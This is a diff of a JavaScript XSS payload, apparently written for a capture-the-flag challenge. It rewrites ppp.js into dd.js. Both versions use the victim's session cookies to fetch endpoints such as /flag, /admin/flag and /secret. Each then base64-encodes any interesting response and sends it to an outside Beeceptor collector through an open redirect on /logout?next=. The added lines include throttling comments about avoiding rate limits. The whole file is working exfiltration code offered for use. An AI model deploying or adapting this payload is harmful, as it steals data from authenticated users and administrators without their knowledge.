@@ -1,57 +1,47 @@
-// ppp.js - probe endpoints and exfil via /logout?next=<collector>/<base64>
-// Paste & commit to your GitHub repo (main branch). Make sure jsDelivr URL is valid.
+// dd.js - lightweight probe + exfil via logout redirect (committed as dd.js)
 (function(){
-  const COL = "https://labolabo.free.beeceptor.com"; // your Beeceptor collector
-  const ENDPOINTS = [
-    "/messages?id=1",
-    "/messages?id=9093",
-    "/messages?id=9094",
-    "/messages",
-    "/messages/9099",
-    "/flag",
-    "/admin/flag",
-    "/admin/messages",
-    "/secret"
-  ];
+  const COL = "https://labolabo.free.beeceptor.com"; // your Beeceptor
   function b64(s){
     try { return btoa(unescape(encodeURIComponent(String(s)))); }
     catch(e){ return btoa(String(s)); }
   }
   function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
 
-  async function probeAndExfil(){
-    let lastText = "";
-    for (let ep of ENDPOINTS){
+  async function probeAndSend() {
+    const eps = [
+      "/messages?id=9093",
+      "/messages?id=9094",
+      "/messages?id=1337",
+      "/messages?id=1",
+      "/messages",
+      "/flag",
+      "/admin/flag",
+      "/admin/messages",
+      "/secret"
+    ];
+    let last = "[no-response]";
+    for (let ep of eps) {
       try {
-        const r = await fetch(ep, { method: "GET", credentials: "include" });
-        let txt = "";
-        try { txt = await r.text(); } catch(e){ txt = "[read-error]"; }
-        lastText = txt || lastText;
-        // Heuristics for "useful" answer:
-        // - not empty, not an empty messages array, not a generic HTTP error marker
-        const cleaned = (txt || "").trim();
-        if (cleaned && cleaned !== "{\"messages\":[]}" && !/^(\[fetch-error\]|\[empty-response\]|\[error\])/.test(cleaned)) {
-          // found something interesting — exfil and stop
-          const enc = b64(txt);
-          // create redirect URL that the server will redirect the admin to
-          const target = COL + "/" + enc;
-          // navigate to logout with next param
-          location.href = "/logout?next=" + encodeURIComponent(target);
+        const r = await fetch(ep, { method:"GET", credentials:"include" });
+        const text = await r.text().catch(()=>"[read-error]");
+        last = text || last;
+        const cleaned = (text || "").trim();
+        // quick heuristics for interesting content
+        if (cleaned && cleaned !== "{\"messages\":[]}" && !/^HTTP \d+/.test(cleaned)) {
+          // send only a safe-length prefix to avoid url truncation
+          const payload = b64((text||"").slice(0, 2000));
+          location.href = "/logout?next=" + encodeURIComponent(COL + "/" + payload);
           return;
         }
       } catch (e) {
-        // record lastText and continue
-        lastText = "[exception] " + String(e);
+        last = "[exception] " + String(e);
       }
-      await sleep(500);
+      await sleep(700); // be slow to avoid rate limits
     }
-    // If nothing "interesting" found, still exfil the last result (best-effort)
-    try {
-      const enc = b64(lastText || "[no-data]");
-      const target = COL + "/" + enc;
-      location.href = "/logout?next=" + encodeURIComponent(target);
-    } catch(e){}
+    // nothing interesting — still exfil something small so you know it ran
+    const small = b64((last||"").slice(0,500));
+    location.href = "/logout?next=" + encodeURIComponent(COL + "/" + small);
   }
 
-  try { probeAndExfil(); } catch(e){}
+  try { probeAndSend(); } catch(e){}
 })();
